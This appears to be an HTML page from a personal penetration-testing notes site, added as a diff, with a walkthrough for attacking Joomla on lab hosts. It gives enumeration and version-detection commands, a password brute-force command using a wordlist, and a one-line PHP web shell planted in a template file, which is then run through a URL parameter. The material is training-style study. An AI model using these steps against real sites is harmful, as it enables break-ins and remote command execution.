@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Joomla (TCP/80, TCP/443)</h1>
+            <p>Free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>
+                <p>In order to check if we are treating with joomla we could perform the following</p>
+                <pre><code class="language-bash">curl -s http://dev.inlanefreight.local/ | grep Joomla
+curl -s http://dev.inlanefreight.local/README.txt | head -n 5</code></pre>
+                <p>Robots.txt is always a good option as it will reveal some that joomla is running</p>
+            
+                <p>Interesting endpoints</p>
+                <pre><code class="language-bash">http://app.inlanefreight.local/joomla/administrator/                                                                                                                                    
+http://app.inlanefreight.local/administrator/  #Admin login                                                                                                                                         
+http://app.inlanefreight.local/bin/                                                                                                                                                     
+http://app.inlanefreight.local/cache/                                                                                                                                                   
+http://app.inlanefreight.local/cli/                                                                                                                                                     
+http://app.inlanefreight.local/components/                                                                                                                                              
+http://app.inlanefreight.local/includes/                                                                                                                                                
+http://app.inlanefreight.local/installation/                                                                                                                                            
+http://app.inlanefreight.local/language/                                                                                                                                                
+http://app.inlanefreight.local/layouts/                                                                                                                                                 
+http://app.inlanefreight.local/libraries/                                                                                                                                               
+http://app.inlanefreight.local/logs/                                                                                                                                                    
+http://app.inlanefreight.local/modules/                                                                                                                                                 
+http://app.inlanefreight.local/plugins/                                                                                                                                                 
+http://app.inlanefreight.local/tmp/</code></pre>
+            
+            <h3>Acquiring version</h3>
+            <ul>
+                <p>Here are some commands that will help us acqure the version</p>
+                <pre><code class="language-bash">curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml</code></pre>
+            </ul>
+            
+            <h3>Automate enumeration process</h3>
+            <ul>
+               <p>A basic way of enumerating joomla is by using joomscan.</p> 
+               <pre><code class="language-bash">joomscan -u http://app.inlanefreight.local</code></pre> 
+            </ul>
+
+            <h3>Username enumeration</h3>
+            <ul>
+                <p>The only way to enumerate users is using brute-force since the <b>admin</b> password is set up during the installation process. At least admin is the default administrator username</p>
+                <pre><code class="language-bash">sudo python3 joomla-brute.py -u http://app.inlanefreight.local/ -w /usr/share/wordlists/rockyou.txt -usr admin</code></pre> 
+            </ul>
+            </ul>
+
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Command execution</h3>
+                <ul>
+                    <p>Now that we identified the admin user and password it's time to perform some command execution. To do so we will modify a template file in order to add our malicious code. Here are the steps to do so:</p>
+                    <ul>
+                        <li>Access the admin panel (/administrator) and go to <b>Templates</b>-> <b>Templates</b> and select <b>template_name Details and Files</b> the template you would like to modify</li>
+                        <li>Select an uncommon file such as <b>error.php</b> and add the following line</li>
+                        <pre><code class="language-php">system($_GET['cmd']);</code></pre> 
+                        <li>Then just look for it and pass the command you would like to execute</li>
+                        <pre><code class="language-url">http://app.inlanefreight.local/templates/protostar/error.php?cmd=ls ../</code></pre>
+                        
+
+                        
+                    </ul>
+                </ul>
+            </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
